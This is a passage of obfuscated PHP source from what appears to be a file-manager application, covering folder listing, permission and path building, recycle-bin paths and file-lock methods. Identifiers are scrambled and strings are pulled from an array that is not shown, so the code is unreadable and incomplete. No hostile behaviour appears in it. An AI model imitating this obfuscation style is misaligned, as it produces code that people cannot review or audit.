$‰Ø¸Ş³Ñ && isset($ô©‹¬¨ş[$Ì¸ÃçÊğ[$³İ°ğ™ì[402]]])) { $Ì¸ÃçÊğ[$³İ°ğ™ì[86]][$³İ°ğ™ì[483]] = array(); foreach ($ô©‹¬¨ş[$Ì¸ÃçÊğ[$³İ°ğ™ì[402]]] as $Ò¾’Á•) { $ÈæÃˆ… = $‰Ø¸Ş³Ñ[$Ò¾’Á•]; $Ì¸ÃçÊğ[$³İ°ğ™ì[86]][$³İ°ğ™ì[483]][] = array($³İ°ğ™ì[484] => $ÈæÃˆ…[$³İ°ğ™ì[399]], $³İ°ğ™ì[420] => $ÈæÃˆ…[$³İ°ğ™ì[32]], $³İ°ğ™ì[485] => $ÈæÃˆ…[$³İ°ğ™ì[486]]); } } if ($”ö“Úû && isset($”ö“Úû[$Ì¸ÃçÊğ[$³İ°ğ™ì[402]]])) { $Ì¸ÃçÊğ[$³İ°ğ™ì[86]][$³İ°ğ™ì[487]] = array(); foreach ($”ö“Úû[$Ì¸ÃçÊğ[$³İ°ğ™ì[402]]] as $˜¾›Š¼ø) { $Ì¸ÃçÊğ[$³İ°ğ™ì[86]][$³İ°ğ™ì[487]] = array($³İ°ğ™ì[488] => $˜¾›Š¼ø[$³İ°ğ™ì[489]], $³İ°ğ™ì[490] => $˜¾›Š¼ø[$³İ°ğ™ì[491]], $³İ°ğ™ì[492] => $˜¾›Š¼ø[$³İ°ğ™ì[402]], $³İ°ğ™ì[493] => $˜¾›Š¼ø[$³İ°ğ™ì[494]], $³İ°ğ™ì[495] => $˜¾›Š¼ø[$³İ°ğ™ì[496]], $³İ°ğ™ì[497] => $˜¾›Š¼ø[$³İ°ğ™ì[497]], $³İ°ğ™ì[498] => $˜¾›Š¼ø[$³İ°ğ™ì[498]]); } } } unset($Ì¸ÃçÊğ); return $Ğ–®‡­ê; } protected function _listAppendChildren(&$âÍ‰¢´, $ëˆÉ‹ßé) { $¹Ÿ÷ã‰ñ =& $_SERVER[ßğøİ]; $œ¾¹Ê = array(); $ÇõÏ€å = array($¹Ÿ÷ã‰ñ[207] => 0, $¹Ÿ÷ã‰ñ[208] => 0); foreach ($âÍ‰¢´ as &$¶°ı£Ç») { if (!$¶°ı£Ç»[$¹Ÿ÷ã‰ñ[410]]) { continue; } $œ¾¹Ê[] = $¶°ı£Ç»[$¹Ÿ÷ã‰ñ[402]]; } unset($¶°ı£Ç»); if (!$œ¾¹Ê) { return; } $ûÈ£˜Ú = array($¹Ÿ÷ã‰ñ[432] => array($¹Ÿ÷ã‰ñ[7], $œ¾¹Ê), $¹Ÿ÷ã‰ñ[431] => 0); $¹×¥ºªä = array($¹Ÿ÷ã‰ñ[432], $¹Ÿ÷ã‰ñ[410], $¹Ÿ÷ã‰ñ[499] => $¹Ÿ÷ã‰ñ[500]); $ïÎÇªóı = $this->field($¹×¥ºªä)->where($ûÈ£˜Ú)->group($¹Ÿ÷ã‰ñ[501])->select(); $Ú‚¡Ù ê = array(); foreach ($ïÎÇªóı as $ó˜æ”Úä) { $‘«øê = $ó˜æ”Úä[$¹Ÿ÷ã‰ñ[432]]; $µÇÌÒ = $ó˜æ”Úä[$¹Ÿ÷ã‰ñ[410]] == $¹Ÿ÷ã‰ñ[88] ? $¹Ÿ÷ã‰ñ[208] : $¹Ÿ÷ã‰ñ[207]; if (!isset($Ú‚¡Ù ê[$‘«øê])) { $Ú‚¡Ù ê[$‘«øê] = array($¹Ÿ÷ã‰ñ[207] => 0, $¹Ÿ÷ã‰ñ[208] => 0); } $Ú‚¡Ù ê[$‘«øê][$µÇÌÒ] += $ó˜æ”Úä[$¹Ÿ÷ã‰ñ[500]]; } foreach ($âÍ‰¢´ as &$¶°ı£Ç») { if (!$¶°ı£Ç»[$¹Ÿ÷ã‰ñ[410]]) { continue; } $ışî†¹ = is_array($Ú‚¡Ù ê[$¶°ı£Ç»[$¹Ÿ÷ã‰ñ[402]]]) ? $Ú‚¡Ù ê[$¶°ı£Ç»[$¹Ÿ÷ã‰ñ[402]]] : $ÇõÏ€å; $¶°ı£Ç»[$¹Ÿ÷ã‰ñ[208]] = $ışî†¹[$¹Ÿ÷ã‰ñ[208]]; $¶°ı£Ç»[$¹Ÿ÷ã‰ñ[207]] = $ışî†¹[$¹Ÿ÷ã‰ñ[207]]; unset($¶°ı£Ç»[$¹Ÿ÷ã‰ñ[412]]); } unset($¶°ı£Ç»); } protected function _listAppendAuth(&$ßÙßÊ™İ) { $ı²ÌºÒÌ =& $_SERVER[ßğøİ]; if (!defined($ı²ÌºÒÌ[475])) { return; } $Ã•¥›îÎ = array(); foreach ($ßÙßÊ™İ as $šë˜ Ô) { if ($šë˜ Ô[$ı²ÌºÒÌ[411]] == self::TYPE_GROUP) { $Ã•¥›îÎ[] = $šë˜ Ô[$ı²ÌºÒÌ[402]]; } } if (!$Ã•¥›îÎ) { return; } $é³™¢¬± = array_to_keyvalue($ßÙßÊ™İ, $ı²ÌºÒÌ[402]); $¨¹†®ÊĞ = Model($ı²ÌºÒÌ[502])->getSourceList($Ã•¥›îÎ, $é³™¢¬±); $°ùÌùµ¹ = $GLOBALS[$ı²ÌºÒÌ[503]] == 1; foreach ($ßÙßÊ™İ as $ÚÎÕ®šÇ => &$šë˜ Ô) { $šë˜ Ô[$ı²ÌºÒÌ[413]] = $¨¹†®ÊĞ[$šë˜ Ô[$ı²ÌºÒÌ[402]]]; if (!$šë˜ Ô[$ı²ÌºÒÌ[413]] && $šë˜ Ô[$ı²ÌºÒÌ[411]] == self::TYPE_GROUP) { $šë˜ Ô[$ı²ÌºÒÌ[413]] = Action($ı²ÌºÒÌ[504])->pathGroupAuthMake($šë˜ Ô[$ı²ÌºÒÌ[505]]); if (!$šë˜ Ô[$ı²ÌºÒÌ[413]] && !$°ùÌùµ¹) { $šë˜ Ô[$ı²ÌºÒÌ[202]] = !1; $šë˜ Ô[$ı²ÌºÒÌ[201]] = !1; } } if ($šë˜ Ô[$ı²ÌºÒÌ[413]]) { $šë˜ Ô[$ı²ÌºÒÌ[202]] = AuthModel::authCheckEdit($šë˜ Ô[$ı²ÌºÒÌ[413]][$ı²ÌºÒÌ[414]]); $šë˜ Ô[$ı²ÌºÒÌ[201]] = AuthModel::authCheckView($šë˜ Ô[$ı²ÌºÒÌ[413]][$ı²ÌºÒÌ[414]]); } $this->groupPathDisplay($šë˜ Ô); } unset($šë˜ Ô); } public function _listAppendAuthSecret(&$âü†¨äÎ) { $©¨“é¥ù =& $_SERVER[ßğøİ]; if (Model($©¨“é¥ù[435])->get($©¨“é¥ù[506]) != $©¨“é¥ù[88]) { return; } static $ÀÒø­ğã = false; if (!$ÀÒø­ğã) { $±ùğÚúò = Model($©¨“é¥ù[507]); $İÂš’ß = Model($©¨“é¥ù[508]); $ÀÒø­ğã = $İÂš’ß->listData(); $ÀÒø­ğã = array_to_keyvalue($ÀÒø­ğã, $©¨“é¥ù[402]); $¤ù¼»ú„ = json_decode(Model($©¨“é¥ù[435])->get($©¨“é¥ù[509]), !0); $¤ù¼»ú„ = array_to_keyvalue($¤ù¼»ú„, $©¨“é¥ù[399]); foreach ($ÀÒø­ğã as $ª¤é®«À => $ÖÃ¸ş«ó) { $Ù½¿¼…ö = $¤ù¼»ú„[$ÖÃ¸ş«ó[$©¨“é¥ù[510]]]; if (!$Ù½¿¼…ö) { $İÂš’ß->remove($ÖÃ¸ş«ó[$©¨“é¥ù[399]]); unset($ÀÒø­ğã[$ª¤é®«À]); continue; } $ò–„ØâÉ = $±ùğÚúò->listData($Ù½¿¼…ö[$©¨“é¥ù[413]]); if (!$ò–„ØâÉ) { $İÂš’ß->remove($ÖÃ¸ş«ó[$©¨“é¥ù[399]]); unset($ÀÒø­ğã[$ª¤é®«À]); continue; } $ÖÃ¸ş«ó[$©¨“é¥ù[413]] = $ò–„ØâÉ; $ÖÃ¸ş«ó[$©¨“é¥ù[511]] = $Ù½¿¼…ö; $ÖÃ¸ş«ó[$©¨“é¥ù[512]] = Model($©¨“é¥ù[513])->getInfoSimpleOuter($ÖÃ¸ş«ó[$©¨“é¥ù[454]]); $ÀÒø­ğã[$ª¤é®«À] = $ÖÃ¸ş«ó; } } $¼îø»ä³ = defined($©¨“é¥ù[514]) ? USER_ID : $©¨“é¥ù[12]; $ÆÙ´Æ•É = array(); $ Í†‹›É = $this->_listAppendPath($ÆÙ´Æ•É, !0); foreach ($âü†¨äÎ as $ª¤é®«À => &$ÖÃ¸ş«ó) { if (!is_array($ÖÃ¸ş«ó[$©¨“é¥ù[413]])) { continue; } if ($ÖÃ¸ş«ó[$©¨“é¥ù[411]] != $©¨“é¥ù[515]) { continue; } if (isset($ÀÒø­ğã[$ÖÃ¸ş«ó[$©¨“é¥ù[402]]])) { $‘ä‹‹é = $ÀÒø­ğã[$ÖÃ¸ş«ó[$©¨“é¥ù[402]]]; if (!is_array($ÖÃ¸ş«ó[$©¨“é¥ù[466]])) { $ÖÃ¸ş«ó[$©¨“é¥ù[466]] = array(); } $ÖÃ¸ş«ó[$©¨“é¥ù[466]][$©¨“é¥ù[516]] = $‘ä‹‹é[$©¨“é¥ù[510]]; $ÖÃ¸ş«ó[$©¨“é¥ù[413]][$©¨“é¥ù[517]] = $‘ä‹‹é; $ÖÃ¸ş«ó[$©¨“é¥ù[413]][$©¨“é¥ù[518]] = $ÖÃ¸ş«ó[$©¨“é¥ù[519]]; $ÖÃ¸ş«ó[$©¨“é¥ù[413]][$©¨“é¥ù[520]] = $©¨“é¥ù[88]; if ($‘ä‹‹é[$©¨“é¥ù[454]] != $¼îø»ä³) { $ÖÃ¸ş«ó[$©¨“é¥ù[413]][$©¨“é¥ù[414]] = $ÖÃ¸ş«ó[$©¨“é¥ù[413]][$©¨“é¥ù[414]] & $‘ä‹‹é[$©¨“é¥ù[413]][$©¨“é¥ù[413]]; } continue; } $²²Œ–º­ = $this->parentLevelArray($ÖÃ¸ş«ó[$©¨“é¥ù[521]]); $ªöÑËÃ‡ = array_reverse($²²Œ–º­); foreach ($ªöÑËÃ‡ as $™ú¿©ı => $™±à×ê) { if (!isset($ÀÒø­ğã[$™±à×ê])) { continue; } $‘ä‹‹é = $ÀÒø­ğã[$™±à×ê]; $ÖÃ¸ş«ó[$©¨“é¥ù[413]][$©¨“é¥ù[517]] = $‘ä‹‹é; if ($‘ä‹‹é[$©¨“é¥ù[454]] != $¼îø»ä³) { $ÖÃ¸ş«ó[$©¨“é¥ù[413]][$©¨“é¥ù[414]] = $ÖÃ¸ş«ó[$©¨“é¥ù[413]][$©¨“é¥ù[414]] & $‘ä‹‹é[$©¨“é¥ù[413]][$©¨“é¥ù[413]]; } $ˆûïáš = $©¨“é¥ù[12]; $“´®´ÛÒ = count($²²Œ–º­) - $™ú¿©ı; for ($Ä›‡é§€ = 0; $Ä›‡é§€ < $“´®´ÛÒ; $Ä›‡é§€++) { if (!isset($ Í†‹›É[$²²Œ–º­[$Ä›‡é§€]])) { $ˆûïáš = $©¨“é¥ù[12]; break; } $ˆûïáš = $ˆûïáš . rtrim($ Í†‹›É[$²²Œ–º­[$Ä›‡é§€]], $©¨“é¥ù[8]) . $©¨“é¥ù[8]; } $ÖÃ¸ş«ó[$©¨“é¥ù[413]][$©¨“é¥ù[518]] = rtrim($ˆûïáš, $©¨“é¥ù[8]) . $©¨“é¥ù[8]; break; } } unset($ÖÃ¸ş«ó); } public function groupPathDisplay(&$Ö´äÁõá) { $¬´Âİ‡È =& $_SERVER[ßğøİ]; if ($Ö´äÁõá[$¬´Âİ‡È[411]] != self::TYPE_GROUP) { return; } $¨¾©Š·ä = Model($¬´Âİ‡È[522])->getInfo($Ö´äÁõá[$¬´Âİ‡È[505]]); $ÉÊÚË†Ü = $this->parentLevelArray($¨¾©Š·ä[$¬´Âİ‡È[521]]); $ŒÃ¢è¸Ü = $¬´Âİ‡È[12]; foreach ($ÉÊÚË†Ü as $½°ûæŞ¢) { $¯İªïŒ† = Model($¬´Âİ‡È[522])->getInfo($½°ûæŞ¢); $ŒÃ¢è¸Ü .= $¯İªïŒ†[$¬´Âİ‡È[86]][$¬´Âİ‡È[402]] . $¬´Âİ‡È[50]; } $Ö´äÁõá[$¬´Âİ‡È[523]] = $¨¾©Š·ä[$¬´Âİ‡È[432]]; $Ö´äÁõá[$¬´Âİ‡È[524]] = $¨¾©Š·ä[$¬´Âİ‡È[521]]; $Ö´äÁõá[$¬´Âİ‡È[525]] = $¨¾©Š·ä[$¬´Âİ‡È[526]]; $Ö´äÁõá[$¬´Âİ‡È[527]] = $ŒÃ¢è¸Ü . $¨¾©Š·ä[$¬´Âİ‡È[86]][$¬´Âİ‡È[402]]; } protected function _listAppendPath(&$‹«Ä—Şö, $Ï¦¥®‰¢ = false) { $Ñ—±°‡¶ =& $_SERVER[ßğøİ]; static $¡ÜÛÊ¯ª = array(); $ıøã ã« = array(); $•‘×÷ = array(); if ($Ï¦¥®‰¢) { return $¡ÜÛÊ¯ª; } foreach ($‹«Ä—Şö as &$ÍÃ»¨¦) { $ÙÜù›¿ = $ÍÃ»¨¦[$Ñ—±°‡¶[402]]; if ($ÍÃ»¨¦[$Ñ—±°‡¶[410]] == $Ñ—±°‡¶[88] && $ÍÃ»¨¦[$Ñ—±°‡¶[432]] != 0) { $¡ÜÛÊ¯ª[$ÙÜù›¿] = $ÍÃ»¨¦[$Ñ—±°‡¶[32]]; } if ($ÍÃ»¨¦[$Ñ—±°‡¶[410]] == $Ñ—±°‡¶[88] && $ÍÃ»¨¦[$Ñ—±°‡¶[432]] == 0 && !isset($¡ÜÛÊ¯ª[$ÙÜù›¿])) { $¡ÜÛÊ¯ª[$ÙÜù›¿] = $this->_listAppendPathRoot($ÍÃ»¨¦, array()); } if (isset($•‘×÷[$ÍÃ»¨¦[$Ñ—±°‡¶[521]]])) { continue; } $•‘×÷[$ÍÃ»¨¦[$Ñ—±°‡¶[521]]] = !0; $×ı ÑÔ = $this->parentLevelArray($ÍÃ»¨¦[$Ñ—±°‡¶[521]]); foreach ($×ı ÑÔ as $­Ø“œé¾ => $ŸŠÓœ¶ë) { if (isset($¡ÜÛÊ¯ª[$ŸŠÓœ¶ë])) { continue; } if ($­Ø“œé¾ == 0) { $¡ÜÛÊ¯ª[$ŸŠÓœ¶ë] = $this->_listAppendPathRoot($ÍÃ»¨¦, $×ı ÑÔ); } if ($­Ø“œé¾ != 0) { $ıøã ã«[] = $ŸŠÓœ¶ë; } } } unset($ÍÃ»¨¦); $ıøã ã« = array_unique($ıøã ã«); if (count($ıøã ã«) > 0) { $‰Õäşœ© = array($Ñ—±°‡¶[417] => array($Ñ—±°‡¶[418], $ıøã ã«)); if (count($ıøã ã«) == 1) { $“‹åÁÜ = $this->sourceInfo($ıøã ã«[0]); $ÇÌ‰¢½Ã = is_array($“‹åÁÜ) ? array($“‹åÁÜ) : !1; } else { $ÇÌ‰¢½Ã = $this->field($Ñ—±°‡¶[528])->where($‰Õäşœ©)->select(); } if (!$ÇÌ‰¢½Ã) { $ÇÌ‰¢½Ã = array(); } foreach ($ÇÌ‰¢½Ã as $ÌÍ¹ÌË) { $¡ÜÛÊ¯ª[$ÌÍ¹ÌË[$Ñ—±°‡¶[402]]] = $ÌÍ¹ÌË[$Ñ—±°‡¶[32]]; } } $‘¾É™š§ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $®®œåû× = array(); foreach ($‹«Ä—Şö as &$ÍÃ»¨¦) { $ä¬Ü¢”¼ = $ÍÃ»¨¦[$Ñ—±°‡¶[521]]; $Óı‰•ö¬ = $Ñ—±°‡¶[12]; if (isset($®®œåû×[$ä¬Ü¢”¼])) { $Óı‰•ö¬ = $®®œåû×[$ä¬Ü¢”¼]; } else { $×ı ÑÔ = $this->parentLevelArray($ÍÃ»¨¦[$Ñ—±°‡¶[521]]); foreach ($×ı ÑÔ as $­Ø“œé¾ => $ŸŠÓœ¶ë) { if (isset($¡ÜÛÊ¯ª[$ŸŠÓœ¶ë])) { $Óı‰•ö¬ .= $¡ÜÛÊ¯ª[$ŸŠÓœ¶ë] . $Ñ—±°‡¶[8]; } } $®®œåû×[$ä¬Ü¢”¼] = $Óı‰•ö¬; } $Óı‰•ö¬ .= $ÍÃ»¨¦[$Ñ—±°‡¶[32]]; if ($ÍÃ»¨¦[$Ñ—±°‡¶[410]] == $Ñ—±°‡¶[88]) { $Óı‰•ö¬ .= $Ñ—±°‡¶[8]; } $ÍÃ»¨¦[$Ñ—±°‡¶[519]] = str_replace($Ñ—±°‡¶[529], $Ñ—±°‡¶[8], $Óı‰•ö¬); if ($ÍÃ»¨¦[$Ñ—±°‡¶[432]] == $Ñ—±°‡¶[197]) { $ÍÃ»¨¦[$Ñ—±°‡¶[32]] = trim($¡ÜÛÊ¯ª[$ÍÃ»¨¦[$Ñ—±°‡¶[402]]], $Ñ—±°‡¶[8]); $ÍÃ»¨¦[$Ñ—±°‡¶[519]] = $ÍÃ»¨¦[$Ñ—±°‡¶[32]] . $Ñ—±°‡¶[8]; } if (intval($ÍÃ»¨¦[$Ñ—±°‡¶[411]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($ÍÃ»¨¦, $×ı ÑÔ, $‘¾É™š§); } } unset($ÍÃ»¨¦); return $‹«Ä—Şö; } private function _listAppendPathRecycle(&$Œ¤Êï›Ğ, $È´×‘ïÀ, $ˆè×Çª¡) { $»”ªÑÈ¼ =& $_SERVER[ßğøİ]; if (!in_array($ˆè×Çª¡, $È´×‘ïÀ) && $Œ¤Êï›Ğ[$»”ªÑÈ¼[402]] != $ˆè×Çª¡) { return; } $Öî…¥Ş‹ = explode($»”ªÑÈ¼[8], trim($Œ¤Êï›Ğ[$»”ªÑÈ¼[519]], $»”ªÑÈ¼[8])); $Ù²İ”ê¾ = implode($»”ªÑÈ¼[8], array_slice($Öî…¥Ş‹, 2)); $Œ¤Êï›Ğ[$»”ªÑÈ¼[519]] = $»”ªÑÈ¼[8] . LNG($»”ªÑÈ¼[530]) . $»”ªÑÈ¼[8] . ltrim($Ù²İ”ê¾, $»”ªÑÈ¼[8]); $Œ¤Êï›Ğ[$»”ªÑÈ¼[521]] = $»”ªÑÈ¼[531] . implode($»”ªÑÈ¼[50], array_slice($È´×‘ïÀ, 1)) . $»”ªÑÈ¼[50]; if ($Œ¤Êï›Ğ[$»”ªÑÈ¼[402]] == $ˆè×Çª¡) { $Œ¤Êï›Ğ[$»”ªÑÈ¼[521]] = $»”ªÑÈ¼[531]; $Œ¤Êï›Ğ[$»”ªÑÈ¼[432]] = $»”ªÑÈ¼[197]; $Œ¤Êï›Ğ[$»”ªÑÈ¼[32]] = LNG($»”ªÑÈ¼[530]); } $Œ¤Êï›Ğ[$»”ªÑÈ¼[532]] = $»”ªÑÈ¼[533]; } protected function _listAppendPathRoot(&$îÕ÷ƒÂÇ, $À°©Ÿ—) { $ê¶±œ’í =& $_SERVER[ßğøİ]; static $èŞŠÉ—ú = false; $ıƒ¬Ú•ò = $ê¶±œ’í[12]; if ($îÕ÷ƒÂÇ[$ê¶±œ’í[411]] == self::TYPE_USER) { if (defined($ê¶±œ’í[475]) && $îÕ÷ƒÂÇ[$ê¶±œ’í[505]] == USER_ID) { $ıƒ¬Ú•ò = LNG($ê¶±œ’í[534]); if ($èŞŠÉ—ú === !1) { $Ò¸©Õö¸ = Model($ê¶±œ’í[535])->getInfoFull(USER_ID); $èŞŠÉ—ú = _get($Ò¸©Õö¸, $ê¶±œ’í[536], $ê¶±œ’í[12]); } if ($À°©Ÿ— && $À°©Ÿ—[0] == $èŞŠÉ—ú || !$À°©Ÿ— && $îÕ÷ƒÂÇ[$ê¶±œ’í[402]] == $èŞŠÉ—ú) { $ıƒ¬Ú•ò = LNG($ê¶±œ’í[537]); $îÕ÷ƒÂÇ[$ê¶±œ’í[538]] = $ê¶±œ’í[539]; } if (!$À°©Ÿ—) { $îÕ÷ƒÂÇ[$ê¶±œ’í[32]] = $ıƒ¬Ú•ò; } } else { $¿Ë§ºü† = Model($ê¶±œ’í[513])->getInfoSimple($îÕ÷ƒÂÇ[$ê¶±œ’í[505]]); $ıƒ¬Ú•ò = LNG($ê¶±œ’í[540]) . $ê¶±œ’í[162] . $¿Ë§ºü†[$ê¶±œ’í[32]] . $ê¶±œ’í[164]; $îÕ÷ƒÂÇ[$ê¶±œ’í[541]] = array($ê¶±œ’í[32] => $¿Ë§ºü†[$ê¶±œ’í[32]], $ê¶±œ’í[542] => $¿Ë§ºü†[$ê¶±œ’í[542]], $ê¶±œ’í[543] => $¿Ë§ºü†[$ê¶±œ’í[543]]); } } else { if ($îÕ÷ƒÂÇ[$ê¶±œ’í[411]] == self::TYPE_GROUP) { $¿Ë§ºü† = Model($ê¶±œ’í[522])->getInfoSimple($îÕ÷ƒÂÇ[$ê¶±œ’í[505]]); $ıƒ¬Ú•ò = $¿Ë§ºü†[$ê¶±œ’í[32]]; } else { if ($îÕ÷ƒÂÇ[$ê¶±œ’í[411]] == self::TYPE_SYSTEM) { $ıƒ¬Ú•ò = $ê¶±œ’í[544]; } } } $ıƒ¬Ú•ò = $ıƒ¬Ú•ò ? $ê¶±œ’í[8] . $ıƒ¬Ú•ò . $ê¶±œ’í[8] : $ê¶±œ’í[8]; return $ıƒ¬Ú•ò; } protected function _listAppendUser(&$Ä»²Ç–) { $¼á¿ìËÔ =& $_SERVER[ßğøİ]; $ƒÈáè³° = array_to_keyvalue($Ä»²Ç–, $¼á¿ìËÔ[12], $¼á¿ìËÔ[454]); $Å˜şò·û = array_to_keyvalue($Ä»²Ç–, $¼á¿ìËÔ[12], $¼á¿ìËÔ[456]); $Ëà”ô°· = array_merge($ƒÈáè³°, $Å˜şò·û); $‚ÕşÊ…¹ = Model($¼á¿ìËÔ[535])->userListInfo($Ëà”ô°·); foreach ($Ä»²Ç– as &$íÍˆÉöş) { $š¹©úë¬ = $íÍˆÉöş[$¼á¿ìËÔ[454]]; $íÍˆÉöş[$¼á¿ìËÔ[454]] = $‚ÕşÊ…¹[$š¹©úë¬] ? $‚ÕşÊ…¹[$š¹©úë¬] : !1; $š¹©úë¬ = $íÍˆÉöş[$¼á¿ìËÔ[456]]; $íÍˆÉöş[$¼á¿ìËÔ[456]] = $‚ÕşÊ…¹[$š¹©úë¬] ? $‚ÕşÊ…¹[$š¹©úë¬] : !1; if (isset($íÍˆÉöş[$¼á¿ìËÔ[466]]) && $íÍˆÉöş[$¼á¿ìËÔ[466]][$¼á¿ìËÔ[545]]) { $œŸÆ§İ = $GLOBALS[$¼á¿ìËÔ[6]][$¼á¿ìËÔ[89]][$¼á¿ìËÔ[546]]; if ($íÍˆÉöş[$¼á¿ìËÔ[466]][$¼á¿ìËÔ[547]] <= time() - $œŸÆ§İ) { $this->metaSet($íÍˆÉöş[$¼á¿ìËÔ[402]], $¼á¿ìËÔ[545], null); $this->metaSet($íÍˆÉöş[$¼á¿ìËÔ[402]], $¼á¿ìËÔ[547], null); unset($íÍˆÉöş[$¼á¿ìËÔ[466]][$¼á¿ìËÔ[545]]); continue; } $ÜÒö„œı = $íÍˆÉöş[$¼á¿ìËÔ[466]][$¼á¿ìËÔ[545]]; $íÍˆÉöş[$¼á¿ìËÔ[466]][$¼á¿ìËÔ[548]] = Model($¼á¿ìËÔ[535])->getInfoSimpleOuter($ÜÒö„œı); } } unset($íÍˆÉöş); } public function parentLevelArray($É…Ü™ëó) { $ÖÑÀ££å =& $_SERVER[ßğøİ]; $É…Ü™ëó = explode($ÖÑÀ££å[50], trim($É…Ü™ëó, $ÖÑÀ££å[50])); return array_remove_value($É…Ü™ëó, $ÖÑÀ££å[197]); } public function listAll($ÈÔ³æ¦) { $ò€²ú» =& $_SERVER[ßğøİ]; $Úè¹ş±ë = $this->sourceInfo($ÈÔ³æ¦); $¯ˆÍÇâŒ = array($ò€²ú»[549] => array($ò€²ú»[550], $Úè¹ş±ë[$ò€²ú»[521]] . $ÈÔ³æ¦ . $ò€²ú»[551]), $ò€²ú»[552] => 0); $Ã¦ËÕğß = $ò€²ú»[553]; $ëÛ÷óÙ® = "\x4c\105\106\124\x20\112\117\x49\x4e\40{$this->tablePrefix}\x69\157\x5f\x66\151\154\x65\40\x66\151\x6c\x65\x20\x6f\156\40\163\x6f\165\x72\x63\x65\x2e\146\151\154\x65\x49\104\40\x3d\40\146\151\x6c\145\x2e\x66\x69\x6c\x65\x49\x44"; $®•×½’ = $this->alias($ò€²ú»[446])->field($Ã¦ËÕğß)->where($¯ˆÍÇâŒ)->join($ëÛ÷óÙ®)->select(); $this->_listAppendAuth($®•×½’); $this->_listAppendUser($®•×½’); $this->_listAppendPath($®•×½’); $®•×½’ = array_to_keyvalue($®•×½’, $ò€²ú»[402]); $ëÓŒì¾Ï = "\57{$Úè¹ş±ë[$ò€²ú»[32]]}\57"; $ëÓŒì¾Ï = $ëÓŒì¾Ï == $ò€²ú»[529] ? $ò€²ú»[8] : $ëÓŒì¾Ï; $Î¤ƒîÏ× = array(); foreach ($®•×½’ as $ÇôÊ²†¥ => $ìõçµäù) { $ƒšºÛ„Ù = $this->parentLevelArray($ìõçµäù[$ò€²ú»[521]]); array_shift($ƒšºÛ„Ù); $­È½ÃÏ½ = $ëÓŒì¾Ï; for ($ÎÔõ»›ñ = 0; $ÎÔõ»›ñ < count($ƒšºÛ„Ù); $ÎÔõ»›ñ++) { $­È½ÃÏ½ .= $®•×½’[$ƒšºÛ„Ù[$ÎÔõ»›ñ]][$ò€²ú»[32]] . $ò€²ú»[8]; } $­È½ÃÏ½ .= $ìõçµäù[$ò€²ú»[32]]; if ($ìõçµäù[$ò€²ú»[410]]) { $­È½ÃÏ½ .= $ò€²ú»[8]; } $­È½ÃÏ½ = str_replace($ò€²ú»[529], $ò€²ú»[8], $­È½ÃÏ½); $­È½ÃÏ½ = str_replace($ò€²ú»[529], $ò€²ú»[8], $­È½ÃÏ½); $ƒò»Ç‹Ò = array($ò€²ú»[421] => str_replace($ò€²ú»[529], $ò€²ú»[8], $­È½ÃÏ½), $ò€²ú»[554] => intval($ìõçµäù[$ò€²ú»[410]]), $ò€²ú»[86] => $this->pathInfoFilter($ìõçµäù)); if (!$ìõçµäù[$ò€²ú»[410]]) { $ƒò»Ç‹Ò[$ò€²ú»[468]] = $ìõçµäù[$ò€²ú»[468]]; $ƒò»Ç‹Ò[$ò€²ú»[87]] = $ìõçµäù[$ò€²ú»[84]]; } $Î¤ƒîÏ×[] = $ƒò»Ç‹Ò; } return $Î¤ƒîÏ×; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($àÛŸÉÊ) { $àÛ˜±Ô² =& $_SERVER[ßğøİ]; if (!$this->allowLock()) { return; } $this->_lockCheck($àÛ˜±Ô²[555], $àÛŸÉÊ); $Â¦©£§å = 1; $this->_lockEvent($àÛŸÉÊ, array($àÛ˜±Ô²[556], $àÛ˜±Ô²[557]), $Â¦©£§å); $this->_lockParent($àÛŸÉÊ, array($àÛ˜±Ô²[557]), $Â¦©£§å); $this->_lockEvent($àÛŸÉÊ, array($àÛ˜±Ô²[558], $àÛ˜±Ô²[559]), $Â¦©£§å); $this->_lockCheckEnd($àÛ˜±Ô²[555], $àÛŸÉÊ); } public function lockCopyEnd($•Õì¶Ú”) { $·ĞÖüö =& $_SERVER[ßğøİ]; if (!$this->allowLock()) { return; } $åÁ§¤Íâ = 0; $this->_lockEvent($•Õì¶Ú”, array($·ĞÖüö[556], $·ĞÖüö[557]), $åÁ§¤Íâ); $this->_lockParent($•Õì¶Ú”, array($·ĞÖüö[557]), $åÁ§¤Íâ); $this->_lockEvent($•Õì¶Ú”, array($·ĞÖüö[558], $·ĞÖüö[559]), $åÁ§¤Íâ); } public function lockWriteStart($ƒÔ¢€ÆË, $×ä¢Ê¤† = '') { $ÇìÉ¾üß =& $_SERVER[ßğøİ]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÇìÉ¾üß[556], $ƒÔ¢€ÆË); $ì±”§ö = 1; $this->_lockKey($ÇìÉ¾üß[560] . $ƒÔ¢€ÆË . $ÇìÉ¾üß[10] . $×ä¢Ê¤†, $ì±”§ö); $this->_lockEvent($ƒÔ¢€ÆË, array($ÇìÉ¾üß[555], $ÇìÉ¾üß[557]), $ì±”§ö); $this->_lockParent($ƒÔ¢€ÆË, array($ÇìÉ¾üß[555], $ÇìÉ¾üß[557]), $ì±”§ö); $this->_lockCheckEnd($ÇìÉ¾üß[556], $ƒÔ¢€ÆË); } public function lockWriteEnd($ß¬Ññ‡°, $Øò¨ºŠ = '') { $ó£ÓÑÆ± =& $_SERVER[ßğøİ]; if (!$this->allowLock()) { return; } $€Š¢‹£â = 0; $this->_lockKey($ó£ÓÑÆ±[560] . $ß¬Ññ‡° . $ó£ÓÑÆ±[10] . $Øò¨ºŠ, $€Š¢‹£â); $this->_lockEvent($ß¬Ññ‡°, array($ó£ÓÑÆ±[555], $ó£ÓÑÆ±[557]), $€Š¢‹£â); $this->_lockParent($ß¬Ññ‡°, array($ó£ÓÑÆ±[555], $ó£ÓÑÆ±[557]), $€Š¢‹£â); } public function lockMoveStart($ÆşúšíÄ) { $­ìÔ•ËŠ =& $_SERVER[ßğøİ]; if (!$this->allowLock()) { return; } $this->_lockCheck($­ìÔ•ËŠ[557], $ÆşúšíÄ); $×•¹Ü» = 1; $this->_lockKey($­ìÔ•ËŠ[561] . $ÆşúšíÄ, $×•¹Ü»); $this->_lockEvent($ÆşúšíÄ, array($­ìÔ•ËŠ[555], $­ìÔ•ËŠ[556]), $×•¹Ü»); $this->_lockParent($ÆşúšíÄ, array($­ìÔ•ËŠ[555], $­ìÔ•ËŠ[557]), $×•¹Ü»); $this->_lockEvent($ÆşúšíÄ, 